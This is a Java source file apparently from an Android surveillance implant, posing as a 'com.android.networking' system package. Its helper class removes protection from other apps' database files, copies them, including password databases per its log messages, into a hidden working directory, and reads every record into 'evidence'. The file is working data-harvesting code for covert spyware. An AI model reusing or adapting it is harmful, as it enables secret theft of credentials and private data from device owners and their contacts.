package com.android.networking.db;

import java.io.File;
import java.io.IOException;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.file.Path;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

/**
 * Helper to access sqlite db.
 * 
 * @author zeno
 * 
 */
public class GenericSqliteHelper { // extends SQLiteOpenHelper {
	private static final String TAG = "GenericSqliteHelper";
	private static final int DB_VERSION = 4;
	public static Object lockObject = new Object();
	private String name;
	private SQLiteDatabase db;

	private GenericSqliteHelper(String name) {
		this.name = name;
	}

	public GenericSqliteHelper(SQLiteDatabase db) {
		this.db = db;

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper open(String dbFile) {
		File fs = new File(dbFile);
		return open(fs);
	}

	public static GenericSqliteHelper open(String databasePath, String dbfile) {
		File fs = new File(databasePath, dbfile);
		return open(fs);
	}

	public static GenericSqliteHelper open(File fs) {
		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath())) {
			return new GenericSqliteHelper(fs.getAbsolutePath());
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String dbFile) {
		File fs = new File(dbFile);

		if (fs.exists() && Path.unprotect(fs.getParent()) && Path.unprotect(fs.getAbsolutePath())) {
			dbFile = fs.getAbsolutePath();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}

		String localFile = Path.markup() + fs.getName();
		try {
			Utils.copy(new File(dbFile), new File(localFile));
		} catch (IOException e) {
			return null;
		}

		return new GenericSqliteHelper(localFile);

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param pathSystem
	 * @param file
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String pathSystem, String file) {
		return openCopy(new File(pathSystem, file).getAbsolutePath());
	}

	/*
	 * @Override public void onCreate(SQLiteDatabase db) { }
	 * 
	 * @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int
	 * newVersion) { if (Cfg.DEBUG) { Check.log(TAG + " (onUpgrade), old: " +
	 * oldVersion); } }
	 */

	/**
	 * Traverse all the records of a table on a projection. Visitor pattern
	 * implementation
	 * 
	 * @param table
	 * @param projection
	 * @param selection
	 * @param visitor
	 */
	public long traverseRecords(String table, RecordVisitor visitor) {
		synchronized (lockObject) {
			SQLiteDatabase db = getReadableDatabase();
			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();

			queryBuilderIndex.setTables(table);

			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(), visitor.getSelection(), null, null,
					null, null);
			//String[] columns = cursor.getColumnNames();

			visitor.init(table, cursor.getCount());

			long maxid = 0;
			// iterate conversation indexes
			while (cursor != null && cursor.moveToNext() && !visitor.isStopRequested()) {
				long id = visitor.cursor(cursor);
				maxid = Math.max(id, maxid);
			}

			visitor.close();
			cursor.close();

			if (this.db == null) {
				db.close();
			}

			return maxid;
		}

	}

	public SQLiteDatabase getReadableDatabase() {
		if (db != null) {
			return db;
		}
		return SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
				| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}

}
